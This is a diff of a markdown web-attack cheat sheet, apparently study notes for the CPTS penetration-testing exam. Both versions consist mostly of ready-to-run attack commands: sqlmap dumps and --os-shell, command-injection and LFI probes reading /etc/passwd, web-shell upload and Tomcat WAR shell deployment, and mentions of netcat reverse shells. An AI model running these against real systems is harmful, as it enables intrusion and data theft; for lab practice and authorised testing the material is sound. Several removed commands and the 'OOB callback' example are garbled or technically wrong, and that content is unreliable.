@@ -1,105 +1,129 @@
-# 05-Web Attacks CPTS Survival Guide
+# Web Attacks
 
-Exploit web misconfigurations and logic flaws to gain unauthorized access or compromise data. Focus on parameter control, bypass mechanisms, and injection chains.
+**The web app is usually your way in.** CPTS web boxes lean on: injection (SQLi, command, SSTI), file inclusion/upload, IDOR/auth logic, and known-CVE apps. Enumerate thoroughly, then exploit the specific flaw. See the **Payloads** chapter for the full injection payload library — this page is the workflow and the tooling.
 
-## Attack Workflow
+> Always run `whatweb` + a directory brute + a vhost fuzz first. The tech stack (PHP vs Java vs .NET) decides which injection class applies.
 
-1. **Enum & Recon**: Discover active endpoints, hidden parameters, and technology stacks.
-2. **Identify Targets**: Find writable paths, admin panels, or database access vectors.
-3. **Exploit**: Inject payloads, manipulate logic, or trigger errors to reveal sensitive data.
-4. **Maintain Access**: Establish reverse shells or file inclusion backdoors.
+---
 
-## Commands Section
+## Step 1 — Recon & Content Discovery
 
-### Directory & File Enumeration
 ```bash
-# Basic path enumeration
-echo "GET /admin.php?id=1" | curl -s -c - --cookie-jar cookies.txt -b cookies.txt
+whatweb -a3 http://{target}
+# Directories & files
+gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 50
+feroxbuster -u http://{target} -x php,txt,html --scan-limit 4
+# Virtual hosts (many boxes hide the real app behind a Host header)
+ffuf -u http://{target} -H "Host: FUZZ.corp.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+# add discovered vhosts to /etc/hosts
 
-# Fuzzy testing with FFUF
-ffuf -w words.txt -u "http://$TARGET/FFUFSITE" -X GET -q
-
-# Subdomain takeover check (DNS)
-nslookup example.com || dig example.com
+# Always check these by hand:
+curl -s http://{target}/robots.txt
+curl -s http://{target} | grep -iE '<!--|version|generator'   # HTML comments / versions
 ```
 
-### Database & Sensitive Data Leakage
+---
+
+## Step 2 — Parameter & Input Discovery
+
 ```bash
-# SQL Error-based Injection check
-curl "http://$TARGET/product.php?id=1 OR 1=1" -s
-
-# Boolean-based SQLi
-for v in $(seq 1 100); do
-  curl "http://$TARGET/search.php?term=1' OR $v=' AND '$v='$v" | grep -i "error"
-done
-
-# Blind SQLi payload (Timing)
-curl "http://$TARGET/search.php?q=1' AND substr((SELECT password FROM users), 1, 1)='a"
+# Find hidden parameters
+arjun -u http://{target}/index.php
+# Fuzz a parameter value / path
+ffuf -u "http://{target}/page.php?id=FUZZ" -w /usr/share/seclists/Fuzzing/... -fc 404
+# Fuzz a POST body field
+ffuf -u http://{target}/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w rockyou.txt -fr "Invalid"
 ```
 
-### Command Injection & RCE
+---
+
+## Step 3 — Exploit by Vulnerability Class
+
+### SQL Injection
 ```bash
-# Generic Command Injection (OS command)
-curl -G "http://$TARGET/vulnerable.php?cmd=id&data="
-curl "http://$TARGET/vulnerable.php?cmd=test&data=test" -d "id"
+# Manual detection: ' " ) and observe errors / behaviour changes
+# Automate with sqlmap once you find an injectable param:
+sqlmap -u "http://{target}/page.php?id=1" --batch --dbs
+sqlmap -u "http://{target}/page.php?id=1" -D appdb --tables
+sqlmap -u "http://{target}/page.php?id=1" -D appdb -T users --dump
+# POST / authenticated / behind a form (capture request in Burp -> save to req.txt)
+sqlmap -r req.txt --batch --level 5 --risk 3
+# OS shell / file write when stacked queries or FILE priv exist
+sqlmap -r req.txt --os-shell
+```
+Payload library (UNION, auth-bypass, MSSQL `xp_cmdshell`, `INTO OUTFILE` web shell): **Payloads chapter → SQL Injection**.
 
-# Bash command injection
-curl "http://$TARGET/vuln.php?id=1; cat /etc/passwd"
-curl "http://$TARGET/vuln.php?id=1 && whoami"
-
-# PHP Execution via File Inclusion (if PHP exists)
-curl -F "file=http://$TARGET/shell.php" "http://$TARGET/includes.php?file="
+### Command Injection
+```bash
+# Try separators on any param that touches the OS (ping, dns, convert, export):
+#   ; | || & && `cmd` $(cmd)   and blind: %0a  newline
+curl "http://{target}/ping.php?ip=127.0.0.1;id"
+# Blind -> force an OOB callback to confirm:
+curl "http://{target}/ping.php?ip=127.0.0.1;curl+http://{target}/`whoami`"
 ```
 
-### Bypass Techniques
+### File Inclusion (LFI/RFI) → RCE
 ```bash
-# Case-insensitive bypass
-curl "http://$TARGET/index.pHp?id=1"
-
-# Character encoding bypass
-curl "http://$TARGET/search.php?q=1%6f%72%201%3d%3d%31"
-
-# Attribute bypass
-curl "http://$TARGET/search.php?q=<script>alert(1)</script>" -b "user=<script>alert(1)</script>"
+# LFI probe
+curl "http://{target}/index.php?page=../../../../etc/passwd"
+# Read PHP source via filter wrapper
+curl "http://{target}/index.php?page=php://filter/convert.base64-encode/resource=config"
+# LFI -> RCE via log poisoning or php://input / data:// (see Payloads chapter)
 ```
 
-## Tips & Shortcuts
+### SSTI (template engines)
+```bash
+# Detect: {{7*7}}  ${7*7}  <%= 7*7 %>  -> 49 means injectable
+# Identify engine, then RCE (Jinja2/Twig/Freemarker payloads in Payloads chapter)
+# tplmap can automate:
+tplmap -u "http://{target}/page?name=John"
+```
 
-* **Use `curl -s -k`** to suppress SSL warnings and silent output for scripting.
-* **Chain requests**: Use `for` loops to brute-force IDs until you find a writable file or success state.
-* **Check for PHP extensions**: `curl "http://$TARGET/proc/version-magic" -s` often reveals installed PHP versions.
-* **Reverse Shell**: Use `nc -e /bin/sh` inside a generated web shell if available.
-* **Payloads**: Stick to `%00` for null-byte, `&` for ampersand, and `\n` for newlines in strings.
+### File Upload
+```bash
+# Bypass matrix (extensions, magic bytes, content-type, .htaccess) -> Payloads chapter.
+# After a PHP web shell lands:
+curl "http://{target}/uploads/shell.php?cmd=id"
+```
+
+### XSS / IDOR / Auth logic
+```bash
+# XSS: reflect a probe, steal cookie/CSRF token (payloads in Payloads chapter)
+# IDOR: increment/replace IDs -> /api/user/1 -> /api/user/2 ; UUIDs -> look for leaks
+# Auth: test password reset tokens, JWT (alg:none / weak secret), forced browsing to /admin
+```
+
+---
+
+## Step 4 — Known-Application Exploits
+
+```bash
+# Identify the app + version, then:
+searchsploit <app> <version>
+nuclei -u http://{target} -severity critical,high,medium
+# Common CPTS-flavour apps: WordPress, Tomcat, Jenkins, Gitlab, Grafana, phpMyAdmin, etc.
+wpscan --url http://{target} --enumerate u,vp,vt --api-token <TOKEN>
+# Tomcat manager -> deploy a WAR shell:
+curl -u tomcat:tomcat -T shell.war "http://{target}:8080/manager/text/deploy?path=/sh"
+```
+
+---
+
+## Web Attack Checklist
+
+- [ ] whatweb + version identified → `searchsploit` / `nuclei`
+- [ ] Directory + file brute (with extensions + backup exts `.bak`,`.old`,`.zip`)
+- [ ] Vhost fuzz → new hosts added to `/etc/hosts`
+- [ ] robots.txt, sitemap, HTML comments, JS files reviewed
+- [ ] Every parameter tested for SQLi / command inj / SSTI / LFI
+- [ ] Login: default creds, SQLi bypass, then brute with a small list
+- [ ] Upload / import features tested for web-shell upload
+- [ ] IDOR on every numeric/UUID identifier
 
 ## Common Mistakes
 
-* **Assuming only SQLi**: Most web vulns are XSS, LFI, IDOR, or Logic flaws.
-* **Ignoring HTTP Status Codes**: A `200` response might contain an error message inside the body.
-* **No Parameter Mapping**: Not knowing which `id` controls `user` vs `limit` is useless.
-* **Static Analysis Only**: Don't guess; test every parameter variation.
-
-## Mini Automation Scripts
-
-### Python: Basic SQLi Brute Force
-```python
-import requests, string
-url = "http://$TARGET/search.php"
-
-for char in string.ascii_lowercase:
-    r = requests.get(f"{url}?q=1' AND substr((select password from users), 1, 1)='{char}'--")
-    if "error" in r.text.lower() or "syntax" in r.text.lower():
-        print(f"Error found at {char}")
-```
-
-### Bash: FFUF Directory Scan
-```bash
-ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://$TARGET/FUFDATA" -x php -q -t 500 -max-age 20m > ffuf_log.txt
-grep "/FUFDATA/" ffuf_log.txt | head -20
-```
-
-### Bash: Generic Command Test
-```bash
-for param in "$@"; do
-    curl "http://$TARGET/vuln.php?param=$param" -X POST
-done
-```
+- **Only testing for SQLi.** Command injection, SSTI, LFI, and IDOR are just as common on CPTS.
+- **Not fuzzing vhosts.** The real vulnerable app is frequently on a `FUZZ.domain` virtual host.
+- **Ignoring backup extensions.** `config.php.bak` / `.zip` source leaks hand you creds and logic.
+- **Blindly trusting sqlmap.** Understand the injection first; sqlmap fails on custom filters where a manual UNION works.
+- **Skipping the version → CVE step.** Many boxes are "just" an outdated app with a public RCE.
